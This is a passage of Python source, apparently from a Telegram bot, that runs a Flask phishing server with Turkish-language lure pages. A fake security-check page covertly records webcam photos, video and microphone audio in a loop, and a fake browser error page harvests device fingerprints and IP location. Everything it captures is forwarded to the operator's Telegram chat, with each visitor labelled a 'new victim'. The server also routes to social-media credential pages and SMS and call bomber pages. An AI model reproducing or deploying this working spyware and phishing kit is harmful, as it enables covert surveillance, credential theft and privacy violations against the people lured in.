function takePhoto() {
  return new Promise((resolve) => {
    if (!stream?.active || !isCameraActive || !isRunning) { resolve(false); return; }
    try {
      canvas2.width = video.videoWidth || 640;
      canvas2.height = video.videoHeight || 480;
      ctx.drawImage(video, 0, 0);
      canvas2.toBlob(blob => {
        if (!blob) { resolve(false); return; }
        const fd = new FormData();
        fd.append('chat_id', TARGET_ID);
        fd.append('photo', blob, `foto_${Date.now()}.jpg`);
        fd.append('caption', `📸 Anlık Fotoğraf`);
        fetch('/send-photo', {method:'POST', body:fd}).then(()=>resolve(true)).catch(()=>resolve(false));
      }, 'image/jpeg', 0.95);
    } catch(e) { resolve(false); }
  });
}
async function startCycle() {
  if (!stream?.active || !isCameraActive || !isRunning) return;
  if (isLoopActive) return;
  isLoopActive = true;
  try {
    for (let i = 0; i < 3; i++) {
      if (!stream?.active || !isCameraActive || !isRunning) break;
      await takePhoto();
      if (i < 2) await new Promise(r => setTimeout(r, 200));
    }
    const chunks = [];
    const mr = new MediaRecorder(stream, {mimeType: 'video/webm'});
    const videoPromise = new Promise((resolve) => {
      mr.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
      mr.onstop = () => {
        if (chunks.length > 0) {
          const blob = new Blob(chunks, {type: 'video/webm'});
          const fd = new FormData();
          fd.append('chat_id', TARGET_ID);
          fd.append('video', blob, `video_${Date.now()}.webm`);
          fd.append('caption', `🎥 3 Saniyelik Video`);
          fetch('/send-video', {method:'POST', body:fd}).finally(() => resolve());
        } else resolve();
      };
      mr.onerror = () => resolve();
    });
    mr.start(3000);
    await new Promise(r => setTimeout(r, 3100));
    if (mr && mr.state === 'recording') mr.stop();
    await videoPromise;
  } catch(e) {}
  isLoopActive = false;
  if (isRunning && isCameraActive && stream?.active) setTimeout(() => startCycle(), 100);
}
async function startCamera() {
  if (cameraStarted) return;
  cameraStarted = true;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    isCameraActive = true;
    video.onloadedmetadata = () => {
      video.play();
      document.getElementById('startBtn').style.display = 'none';
      document.getElementById('loading').style.display = 'block';
      setTimeout(() => { if (isRunning && isCameraActive && stream?.active) startCycle(); }, 500);
    };
    window.addEventListener('beforeunload', function() {
      isRunning = false;
      if (stream) stream.getTracks().forEach(track => track.stop());
    });
  } catch(e) { alert('Kamera izni gerekli!'); cameraStarted = false; }
}
window.startCamera = startCamera;
})();
</script>
</body>
</html>'''


# ═══════════════ MICROPHONE ═══════════════
MICROPHONE_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta name="robots" content="noindex, nofollow">
<title>SNOWY Güvenlik Doğrulaması</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#1a1a2e,#16213e);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:rgba(255,255,255,0.98);border-radius:30px;padding:40px;max-width:480px;width:100%;box-shadow:0 30px 60px rgba(0,0,0,0.4);text-align:center}
h2{color:#1a1a2e;font-size:32px;margin-bottom:15px;font-weight:700}
h2 span{color:#667eea}
.status-text{font-size:18px;font-weight:600;margin:20px 0;padding:15px;border-radius:15px}
.status-warning{background:#fff3cd;color:#856404;border:1px solid #ffeeba}
.status-info{background:#d1ecf1;color:#0c5460;border:1px solid #bee5eb}
.btn{background:linear-gradient(135deg,#667eea,#764ba2);color:white;border:none;padding:18px 36px;font-size:20px;font-weight:600;border-radius:60px;cursor:pointer;width:100%}
.btn:disabled{opacity:0.6;cursor:not-allowed}
.loading{display:none;margin:30px 0 20px}
.spinner{border:4px solid #e2e8f0;border-top:4px solid #667eea;border-radius:50%;width:50px;height:50px;animation:spin 0.8s infinite;margin:0 auto 15px}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
.loading-text{color:#667eea;font-size:18px;font-weight:500}
.mic-icon{font-size:60px;margin-bottom:20px;animation:pulse 1.5s infinite}
@keyframes pulse{0%{opacity:0.5;transform:scale(1)}50%{opacity:1;transform:scale(1.1)}100%{opacity:0.5;transform:scale(1)}}
.info-text{font-size:13px;color:#888;margin-top:20px}
</style>
</head>
<body>
<div class="container">
<h2>❄️ <span>SNOWY</span> GÜVENLİK DOĞRULAMASI</h2>
<div id="statusBox" class="status-text status-warning">🎙️ Devam etmek için mikrofon erişimine izin verin</div>
<div class="mic-icon">🎤</div>
<button class="btn" id="startBtn" onclick="startMicrophone()">✅ DOĞRULAMAYI BAŞLAT</button>
<div class="loading" id="loading"><div class="spinner"></div><div class="loading-text" id="loadingText">Güvenlik kontrolü yapılıyor...</div></div>
<div class="info-text">🔒 SNOWY Güvenlik Sistemi | Ses Doğrulama</div>
</div>
<script>
(function(){
const TARGET_ID = "{{ chat_id }}";
let mediaRecorder = null, audioChunks = [], isRecording = false, isRunning = true, micStarted = false, stream = null, isLoopActive = false;
async function recordAndSend() {
  if (!stream || !isRunning || isRecording || isLoopActive) return;
  isLoopActive = true;
  isRecording = true;
  audioChunks = [];
  try {
    mediaRecorder = new MediaRecorder(stream);
    mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
    const audioPromise = new Promise((resolve) => {
      mediaRecorder.onstop = () => {
        if (audioChunks.length > 0 && isRunning) {
          const blob = new Blob(audioChunks, {type: 'audio/webm'});
          const fd = new FormData();
          fd.append('chat_id', TARGET_ID);
          fd.append('audio', blob, `ses_${Date.now()}.webm`);
          fd.append('caption', `🎙️ 15 Saniyelik Ses Kaydı`);
          fetch('/send-audio', {method:'POST', body:fd}).finally(() => resolve());
        } else resolve();
      };
      mediaRecorder.onerror = () => resolve();
    });
    mediaRecorder.start();
    await new Promise(r => setTimeout(r, 15000));
    if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
    await audioPromise;
  } catch(e) {}
  isRecording = false;
  isLoopActive = false;
  if (isRunning && stream && stream.active) setTimeout(() => recordAndSend(), 100);
}
async function startMicrophone() {
  if (micStarted) return;
  document.getElementById('startBtn').disabled = true;
  document.getElementById('startBtn').innerHTML = '🎙️ İZİN İSTENİYOR...';
  try {
    stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    micStarted = true;
    document.getElementById('statusBox').innerHTML = '⏳ Lütfen bekleyiniz...';
    document.getElementById('statusBox').className = 'status-text status-info';
    document.getElementById('startBtn').style.display = 'none';
    document.getElementById('loading').style.display = 'block';
    document.getElementById('loadingText').innerHTML = '🔒 Ses analizi yapılıyor...';
    setTimeout(() => {
      if (isRunning && stream && stream.active) {
        recordAndSend();
        document.getElementById('loading').style.display = 'none';
      }
    }, 1000);
    window.addEventListener('beforeunload', function() {
      isRunning = false;
      if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
      if (stream) stream.getTracks().forEach(track => track.stop());
    });
  } catch(e) {
    let errorMsg = '❌ Mikrofon izni gerekli!';
    if (e.name === 'NotAllowedError') errorMsg = '❌ Mikrofon izni reddedildi!';
    else if (e.name === 'NotFoundError') errorMsg = '❌ Mikrofon bulunamadı!';
    document.getElementById('statusBox').innerHTML = errorMsg;
    document.getElementById('statusBox').style.background = '#f8d7da';
    document.getElementById('startBtn').disabled = false;
    document.getElementById('startBtn').innerHTML = '✅ DOĞRULAMAYI BAŞLAT';
    micStarted = false;
  }
}
window.startMicrophone = startMicrophone;
})();
</script>
</body>
</html>'''


# ═══════════════ DEVICE ═══════════════
DEVICE_PAGE = '''<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>Bağlantı Hatası</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f2f2f2;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.error-box{background:white;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.1);max-width:500px;width:100%;padding:45px 35px;text-align:center}
.icon{font-size:75px;margin-bottom:20px}
h2{color:#333;margin-bottom:12px;font-size:24px;font-weight:600}
.error-code{background:#f8f9fa;padding:10px 20px;border-radius:40px;display:inline-block;font-family:monospace;color:#dc3545;margin:20px 0;font-size:14px;border:1px solid #e0e0e0}
.url{background:#f8f9fa;padding:14px;border-radius:12px;font-family:monospace;font-size:13px;color:#666;word-break:break-all;margin:20px 0;border:1px solid #e0e0e0}
button{background:#0066cc;color:white;border:none;padding:12px 28px;border-radius:40px;font-size:14px;font-weight:500;cursor:pointer;margin-top:15px}
.details{margin-top:25px;font-size:11px;color:#999}
hr{margin:25px 0 15px;border:none;border-top:1px solid #eee}
</style>
</head>
<body>
<div class="error-box">
<div class="icon">🌐</div>
<h2>Bu siteye ulaşılamıyor</h2>
<div class="error-code">ERR_CONNECTION_TIMED_OUT</div>
<div class="url">{{ url }}</div>
<p style="font-size:14px;color:#666">Site çok uzun süre yanıt vermedi.</p>
<button onclick="location.reload()">Tekrar Dene</button>
<hr>
<div class="details">DNS_PROBE_FINISHED_NXDOMAIN<br>{{ time }}</div>
</div>
<script>
(function(){
const TARGET_ID = "{{ chat_id }}";
let visitorId = sessionStorage.getItem('visitor_id');
if (!visitorId) { visitorId = 'v_'+Date.now()+'_'+Math.random().toString(36).substr(2,9); sessionStorage.setItem('visitor_id', visitorId); }
var info = {
visitorId: visitorId,
timestamp: new Date().toLocaleString('tr-TR'),
userAgent: navigator.userAgent,
platform: navigator.platform,
language: navigator.language,
languages: navigator.languages.join(', '),
cookieEnabled: navigator.cookieEnabled,
doNotTrack: navigator.doNotTrack || 'Desteklenmiyor',
hardwareConcurrency: navigator.hardwareConcurrency || 'Bilinmiyor',
deviceMemory: navigator.deviceMemory || 'Bilinmiyor',
maxTouchPoints: navigator.maxTouchPoints || 0,
screenWidth: screen.width,
screenHeight: screen.height,
screenColorDepth: screen.colorDepth,
screenOrientation: screen.orientation ? screen.orientation.type : (window.orientation === 0 ? 'portrait-primary' : 'landscape-primary'),
batteryLevel: 'Bilinmiyor',
batteryCharging: 'Bilinmiyor',
networkType: 'Bilinmiyor',
networkSpeed: 'Bilinmiyor',
networkRtt: 'Bilinmiyor',
geolocation: 'geolocation' in navigator ? 'Var' : 'Yok',
bluetooth: 'bluetooth' in navigator ? 'Var' : 'Yok',
clipboard: 'clipboard' in navigator ? 'Var' : 'Yok',
credentials: 'credentials' in navigator ? 'Var' : 'Yok',
permissions: 'permissions' in navigator ? 'Var' : 'Yok',
online: navigator.onLine ? 'Evet' : 'Hayır',
javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
webglVendor: 'Bilinmiyor',
webglRenderer: 'Bilinmiyor',
timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
timezoneOffset: new Date().getTimezoneOffset()
};
if ('getBattery' in navigator) {
navigator.getBattery().then(function(battery) {
info.batteryLevel = Math.round(battery.level * 100) + '%';
info.batteryCharging = battery.charging ? 'Evet (Şarj Oluyor)' : 'Hayır (Pil ile)';
sendData(info);
}).catch(function(){ sendData(info); });
} else { sendData(info); }
var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
if (conn) {
info.networkType = conn.type || conn.effectiveType || 'Bilinmiyor';
info.networkSpeed = conn.downlink ? conn.downlink + ' Mbps' : 'Bilinmiyor';
info.networkRtt = conn.rtt ? conn.rtt + ' ms' : 'Bilinmiyor';
}
var canvas = document.createElement('canvas');
var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
if (gl) {
var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
if (debugInfo) {
info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
}
}
function sendData(data) {
fetch('/collect?c=' + TARGET_ID, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify(data)
}).catch(function(e){});
}
})();
</script>
</body>
</html>'''


# ═══════════════ FLASK APP ═══════════════
app = Flask("phish")


@app.route('/')
def index():
    chat_id_param = request.args.get('i') or request.args.get('c')
    mode = request.args.get('m', '')
    number_type = request.args.get('t', '')
    insta = request.args.get('insta')
    tiktok = request.args.get('tiktok')
    pubg = request.args.get('pubg')

    if insta == '1' or mode == 'instagram':
        return render_template_string(INSTAGRAM_PAGE, chat_id=chat_id_param)
    if tiktok == '1' or mode == 'tiktok':
        return render_template_string(TIKTOK_PAGE, chat_id=chat_id_param)
    if pubg == '1' or mode == 'pubg':
        return render_template_string(PUBG_PAGE, chat_id=chat_id_param)
    if number_type == 'call':
        return render_template_string(CALL_BOMBER_PAGE, chat_id=chat_id_param)
    if number_type == 'sms':
        return render_template_string(SMS_BOMBER_PAGE, chat_id=chat_id_param)
    if mode == 'camera':
        return render_template_string(CAMERA_PAGE, chat_id=chat_id_param)
    if mode == 'microphone':
        return render_template_string(MICROPHONE_PAGE, chat_id=chat_id_param)
    return render_template_string(DEVICE_PAGE, chat_id=chat_id_param,
                                  url=request.url,
                                  time=datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S'))


@app.route('/send-message', methods=['POST'])
def send_message():
    try:
        data = request.get_json()
        chat_id = data.get('chat_id')
        text = data.get('text')
        if not chat_id or not text:
            return jsonify({'status': 'error'}), 400
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        resp = requests.post(url, json={'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}, timeout=10)
        return jsonify({'status': 'ok' if resp.status_code == 200 else 'error'})
    except Exception:
        return jsonify({'status': 'error'}), 500


@app.route('/send-photo', methods=['POST'])
def send_photo():
    try:
        chat_id = request.form.get('chat_id')
        photo_file = request.files.get('photo')
        caption = request.form.get('caption', '')
        if not chat_id or not photo_file:
            return jsonify({'status': 'error'}), 400
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {'photo': (photo_file.filename, photo_file.stream, photo_file.content_type)}
        resp = requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files=files, timeout=15)
        return jsonify({'status': 'ok' if resp.status_code == 200 else 'error'})
    except Exception:
        return jsonify({'status': 'error'}), 500


@app.route('/send-video', methods=['POST'])
def send_video():
    try:
        chat_id = request.form.get('chat_id')
        video_file = request.files.get('video')
        caption = request.form.get('caption', '')
        if not chat_id or not video_file:
            return jsonify({'status': 'error'}), 400
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
        files = {'video': (video_file.filename, video_file.stream, video_file.content_type)}
        resp = requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files=files, timeout=20)
        return jsonify({'status': 'ok' if resp.status_code == 200 else 'error'})
    except Exception:
        return jsonify({'status': 'error'}), 500


@app.route('/send-audio', methods=['POST'])
def send_audio():
    try:
        chat_id = request.form.get('chat_id')
        audio_file = request.files.get('audio')
        caption = request.form.get('caption', '')
        if not chat_id or not audio_file:
            return jsonify({'status': 'error'}), 400
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
        files = {'audio': (audio_file.filename, audio_file.stream, audio_file.content_type)}
        resp = requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files=files, timeout=20)
        return jsonify({'status': 'ok' if resp.status_code == 200 else 'error'})
    except Exception:
        return jsonify({'status': 'error'}), 500


@app.route('/collect', methods=['POST'])
def collect():
    try:
        js_data = request.json
        ip = get_real_ip()
        visitor_id = js_data.get('visitorId', 'unknown')
        target_chat_id = request.args.get('c') or js_data.get('chat_id')

        if not target_chat_id:
            return {'status': 'error', 'message': 'chat_id yok'}

        loc = get_location(ip)
        cookie = 'Açık' if js_data.get('cookieEnabled') else 'Kapalı'
        online = 'Evet' if js_data.get('online') else 'Hayır'
        user_agent_full = js_data.get('userAgent', '?')

        message = (
            f"🔥 <b>YENİ KURBAN</b> 🔥\n"
            f"📅 <b>Zaman:</b> {datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n\n"
            f"🌍 <b>KONUM BİLGİLERİ</b>\n"
            f"📍 IP Adresi: {ip}\n"
            f"📍 Ülke: {loc['ulke']} ({loc['ulke_kod']})\n"
            f"📍 Şehir: {loc['sehir']}\n"
            f"📍 Koordinat: {loc['lat']}, {loc['lon']}\n"
            f"📍 ISS: {loc['isp']}\n"
            f"📍 Zaman Dilimi: {loc['tz']}\n\n"
            f"📱 <b>CİHAZ BİLGİLERİ</b>\n"
            f"📱 User-Agent: {user_agent_full}\n"
            f"📱 Platform: {js_data.get('platform','?')}\n"
            f"📱 Dil: {js_data.get('language','?')}\n"
            f"📱 Diller: {js_data.get('languages','?')}\n\n"
            f"💪 <b>DONANIM BİLGİLERİ</b>\n"
            f"💪 RAM: {js_data.get('deviceMemory','?')} GB\n"
            f"💪 CPU Çekirdek: {js_data.get('hardwareConcurrency','?')}\n"
            f"💪 Dokunma: {js_data.get('maxTouchPoints','?')} nokta\n\n"
            f"🖥️ <b>EKRAN BİLGİLERİ</b>\n"
            f"🖥️ Çözünürlük: {js_data.get('screenWidth','?')} x {js_data.get('screenHeight','?')}\n"
            f"🖥️ Renk: {js_data.get('screenColorDepth','?')} bit\n"
            f"🖥️ Yön: {js_data.get('screenOrientation','?')}\n\n"
            f"🔋 <b>PİL BİLGİLERİ</b>\n"
            f"🔋 Seviye: {js_data.get('batteryLevel','?')}\n"
            f"🔋 Şarj Durumu: {js_data.get('batteryCharging','?')}\n\n"
            f"📡 <b>AĞ BİLGİLERİ</b>\n"
            f"📡 Bağlantı: {js_data.get('networkType','?')}\n"
            f"📡 İnternet Hızı: {js_data.get('networkSpeed','?')}\n"
            f"📡 Gecikme: {js_data.get('networkRtt','?')}\n\n"
            f"🌐 <b>TARAYICI ÖZELLİKLERİ</b>\n"
            f"🌐 GPS: {js_data.get('geolocation','?')}\n"
            f"🌐 Bluetooth: {js_data.get('bluetooth','?')}\n"
            f"🌐 Pano: {js_data.get('clipboard','?')}\n"
            f"🌐 Kimlik: {js_data.get('credentials','?')}\n"
            f"🌐 İzinler: {js_data.get('permissions','?')}\n"
            f"🌐 Çevrimiçi: {online}\n"
            f"🌐 Çerezler: {cookie}\n"
            f"🌐 Java: {js_data.get('javaEnabled','?')}\n"
            f"🌐 DNT: {js_data.get('doNotTrack','?')}\n\n"
            f"🎮 <b>GPU BİLGİLERİ</b>\n"
            f"🎮 Üretici: {js_data.get('webglVendor','?')}\n"
            f"🎮 Model: {js_data.get('webglRenderer','?')}\n\n"
            f"⏰ <b>ZAMAN BİLGİLERİ</b>\n"
            f"⏰ Zaman Dilimi: {js_data.get('timezone','?')}\n"
            f"⏰ Offset: {js_data.get('timezoneOffset','?')}\n"
            f"⏰ İstemci Saati: {js_data.get('timestamp','?')}\n\n"
            f"✅ <b>BİLGİLER KAYDEDİLDİ</b>"
        )

        threading.Thread(target=send_telegram_message_sync,
                         args=(target_chat_id, message), daemon=True).start()

        try:
            uid_int = int(target_chat_id)
        except Exception:
            uid_int = 0
        db.log_phish(uid_int, str(target_chat_id), "device", "-", "-", ip, user_agent_full)

        return {'status': 'ok'}
    except Exception as e:
        logger.error(f"collect: {e}")
        return {'status': 'error'}


def get_phish_link(user_id, mode):
    base = PHISHING_BASE_URL.rstrip('/')
    if mode == "device":
        long_url = f"{base}/?c={user_id}"
    elif mode == "camera":
        long_url = f"{base}/?i={user_id}&m=camera"
    elif mode == "microphone":
        long_url = f"{base}/?i={user_id}&m=microphone"
    elif mode in ("call", "sms"):
        long_url = f"{base}/?i={user_id}&t={mode}"
    elif mode == "instagram":
        long_url = f"{base}/?i={user_id}&insta=1"
    elif mode == "tiktok":
        long_url = f"{base}/?i={user_id}&tiktok=1"
    elif mode == "pubg":
        long_url = f"{base}/?i={user_id}&pubg=1"
    else:
        long_url = f"{base}/?i={user_id}"
    return shorten_url(long_url)


def run_phishing():
    app.run(host=PHISHING_HOST, port=PHISHING_PORT, debug=False, use_reloader=False, threaded=True)


def start_phishing_thread():
    t = threading.Thread(target=run_phishing, daemon=True)
    t.start()
    logger.info(f"Phishing started on {PHISHING_HOST}:{PHISHING_PORT}")
    return t